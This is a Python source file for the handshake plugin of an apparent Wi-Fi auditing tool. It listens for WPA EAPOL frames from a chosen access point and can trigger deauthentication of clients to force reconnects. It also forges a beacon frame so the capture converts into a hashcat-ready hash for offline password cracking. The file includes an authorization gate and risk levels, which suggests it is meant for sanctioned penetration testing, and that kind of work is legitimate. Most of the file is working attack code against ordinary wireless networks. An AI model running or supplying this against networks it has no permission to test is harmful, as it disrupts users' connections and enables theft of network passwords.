"""Handshake plugin — risk=active, or risk=high when auto-deauth is on.

Locks the radio to the target AP's channel, listens for EAPOL key frames,
runs a native M1-M4 state machine for the TUI's live progress display, then
delegates final validation to hcxpcapngtool. Optionally pulls in DeauthPlugin
to provoke a client reconnect.
"""

from __future__ import annotations

import threading
import time
from pathlib import Path
from typing import Any

import click

from wlan_dumper.core.auth import AuthorizationGate, PluginRisk
from wlan_dumper.core.events import (
    EAPOLCapture,
    EventBus,
    HandshakeComplete,
)
from wlan_dumper.plugins.base import Plugin, PluginContext
from wlan_dumper.plugins.deauth import DeauthPlugin
from wlan_dumper.utils.hcxtools import convert_to_22000
from wlan_dumper.utils.paths import handshake_path
from wlan_dumper.utils.pcap_writer import append_packets

# libpcap DLT for radiotap-prefixed 802.11 frames. The sniffer hands us raw
# radiotap bytes, so the pcap header must declare this or hcxpcapngtool treats
# the file as Ethernet and reads nothing.
_DLT_IEEE802_11_RADIO = 127


class HandshakePlugin(Plugin):
    name = "handshake"
    risk = PluginRisk.ACTIVE
    requires_injection = False  # auto-deauth elevates this at call time

    def __init__(self) -> None:
        self._bus: EventBus | None = None
        self._target_bssid: str | None = None
        self._target_station: str | None = None
        self._essid: str | None = None
        self._pcap_path: Path | None = None
        self._state: set[int] = set()
        self._beacon_written = False
        self._completed = threading.Event()

    # ---- CLI surface -------------------------------------------------------
    def register_cli(self, group: click.Group) -> None:
        @group.command(name=self.name, help="Capture WPA 4-way handshake")
        @click.option("--target", "-t", required=True, help="AP BSSID")
        @click.option("--client", "-c", default="broadcast", show_default=True)
        @click.option("--no-deauth", is_flag=True, help="Disable auto-deauth")
        @click.option("--count", "-n", default=8, show_default=True, type=int)
        @click.option("--timeout", default=60, show_default=True, type=int)
        @click.option(
            "--note",
            default=None,
            help="Free-text note appended to the audit-log line",
        )
        @click.pass_context
        def handshake_cmd(
            ctx: click.Context,
            target: str,
            client: str,
            no_deauth: bool,
            count: int,
            timeout: int,
            note: str | None,
        ) -> None:
            from wlan_dumper.cli import build_runtime_for

            runtime = build_runtime_for(ctx)
            target_station = None if client.lower() == "broadcast" else client
            rc = self.execute(
                bus=runtime.bus,
                gate=runtime.gate,
                iface=runtime.adapter.iface,
                target_bssid=target,
                target_station=target_station,
                essid=None,
                auto_deauth=not no_deauth,
                deauth_count=count,
                timeout=timeout,
                reason=note,
            )
            ctx.exit(rc)

    # ---- main entry --------------------------------------------------------
    def execute(
        self,
        *,
        bus: EventBus,
        gate: AuthorizationGate,
        iface: str,
        target_bssid: str,
        target_station: str | None,
        essid: str | None,
        auto_deauth: bool = True,
        deauth_count: int = 8,
        timeout: float = 60.0,
        reason: str | None = None,
    ) -> int:
        effective_risk = PluginRisk.HIGH if auto_deauth else self.risk
        gate.check(
            plugin=self.name,
            risk=effective_risk,
            target=target_bssid,
            reason=reason,
        )

        self._arm(
            bus=bus,
            target_bssid=target_bssid,
            target_station=target_station,
            essid=essid,
        )

        try:
            if auto_deauth:
                DeauthPlugin().execute(
                    bus=bus,
                    gate=gate,
                    iface=iface,
                    target_bssid=target_bssid,
                    target_station=target_station,
                    count=deauth_count,
                    reason=reason,
                )
            self._completed.wait(timeout=timeout)
            return 0 if self._completed.is_set() else 1
        finally:
            self._disarm(bus)

    # ---- state machine ----------------------------------------------------
    def _arm(
        self,
        *,
        bus: EventBus,
        target_bssid: str,
        target_station: str | None,
        essid: str | None,
    ) -> None:
        self._bus = bus
        self._target_bssid = target_bssid.lower()
        self._target_station = target_station.lower() if target_station else None
        self._essid = essid
        self._pcap_path = handshake_path(essid, target_bssid)
        self._state = set()
        self._beacon_written = False
        self._completed.clear()
        bus.subscribe(EAPOLCapture, self._on_eapol)

    def _disarm(self, bus: EventBus) -> None:
        bus.unsubscribe(EAPOLCapture, self._on_eapol)

    def _on_eapol(self, evt: EAPOLCapture) -> None:
        if self._bus is None or self._pcap_path is None:
            return
        if self._completed.is_set():
            return  # already emitted; further frames are noise
        if evt.bssid.lower() != self._target_bssid:
            return
        if self._target_station and evt.station.lower() != self._target_station:
            return

        # Persist every frame so even partial captures are diagnostically
        # useful. The bytes are raw radiotap-prefixed 802.11 frames, so they
        # must be decoded as RadioTap (NOT Ether) and written under the radiotap
        # DLT — otherwise hcxpcapngtool sees "DLT_EN10MB, radiotap missing" and
        # reads zero frames from the file.
        import scapy.all as s

        try:
            frame: Any = s.RadioTap(evt.raw)
        except Exception:
            frame = s.Raw(load=evt.raw)

        frames: list[Any] = []
        # hcxpcapngtool needs a beacon/probe-resp to bind the EAPOL frames to an
        # ESSID before it can emit a hash. We know the ESSID from the AP the
        # operator selected, so we reconstruct one beacon deterministically
        # rather than racing to sniff a real one mid-capture. Written once.
        if not self._beacon_written:
            beacon = self._synthetic_beacon()
            if beacon is not None:
                frames.append(beacon)
            self._beacon_written = True
        frames.append(frame)
        append_packets(self._pcap_path, frames, linktype=_DLT_IEEE802_11_RADIO)

        if evt.message_index is not None:
            self._state.add(evt.message_index)

        # A crackable WPA handshake needs the AP's ANONCE (M1) plus the client's
        # SNONCE+MIC (M2); M2+M3 also works. Emit as soon as we have a usable
        # pair — do NOT gate on hcxpcapngtool succeeding: the capture is real
        # even when the conversion tool is missing or the pcap lacks extras.
        # ``valid_by_hcxtool`` records whether the .22000 was actually produced.
        have_pair = {1, 2}.issubset(self._state) or {2, 3}.issubset(self._state)
        if have_pair:
            hashcat = convert_to_22000(self._pcap_path)
            self._bus.publish(
                HandshakeComplete(
                    timestamp=time.time(),
                    bssid=self._target_bssid,
                    station=evt.station,
                    pcap_path=str(self._pcap_path),
                    hashcat_path=str(hashcat) if hashcat else None,
                    valid_by_hcxtool=hashcat is not None,
                )
            )
            self._completed.set()

    def _synthetic_beacon(self) -> Any | None:
        """Build a minimal beacon carrying the ESSID, or None for a hidden AP.

        Returns a scapy ``RadioTap``/``Dot11Beacon`` frame whose SSID element
        holds the target ESSID — this is what lets hcxpcapngtool associate the
        EAPOL frames with a network name and emit a hash. Hidden networks
        (no ESSID known) return ``None``; their name must be recovered first.
        """
        if not self._essid or self._target_bssid is None:
            return None
        import scapy.all as s

        return (
            s.RadioTap()
            / s.Dot11(
                type=0,
                subtype=8,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=self._target_bssid,
                addr3=self._target_bssid,
            )
            / s.Dot11Beacon(cap="ESS+privacy")
            / s.Dot11Elt(ID=0, info=self._essid.encode("utf-8", "replace"))
        )

    def run(self, ctx: PluginContext) -> int:  # pragma: no cover — CLI uses execute()
        raise NotImplementedError("call HandshakePlugin.execute(...) directly")
